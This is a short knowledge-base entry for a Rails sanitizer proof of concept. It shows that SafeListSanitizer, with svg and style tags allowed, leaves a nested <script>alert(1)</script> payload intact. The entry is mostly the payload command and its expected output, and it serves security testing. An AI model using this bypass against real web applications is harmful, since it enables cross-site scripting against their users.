---
data: >-
  Rails::Html::SafeListSanitizer.new.sanitize("<svg><style><script>alert(1)</script></style></svg>",
  tags: ["svg", "style"]).to_s
tags:
  - xss
  - sanitize
type: command
output: '"<svg><style><script>alert(1)</script></style></svg>"'
executor: irb
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:16.336Z'
id: e5ae28af-b8b5-40db-aabf-b37967a9ea86
verified: false
validated: true
submitted: true
---
# sanitize-svg-style-poc

## Command

```irb
Rails::Html::SafeListSanitizer.new.sanitize("<svg><style><script>alert(1)</script></style></svg>", tags: ["svg", "style"]).to_s
```

## Description

Sanitizes an SVG+style PoC payload and converts to string to demonstrate unfiltered script retention.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| tags | Array of allowed tags ["svg", "style"] | Yes |

## Examples

### Basic Usage

```irb
Rails::Html::SafeListSanitizer.new.sanitize("<svg><style><script>alert(1)</script></style></svg>", tags: ["svg", "style"]).to_s
```

### Advanced Usage

N/A

## Expected Output

"<svg><style><script>alert(1)</script></style></svg>" (payload intact).

## Related

- [[commands/sanitize-math-style-poc]]
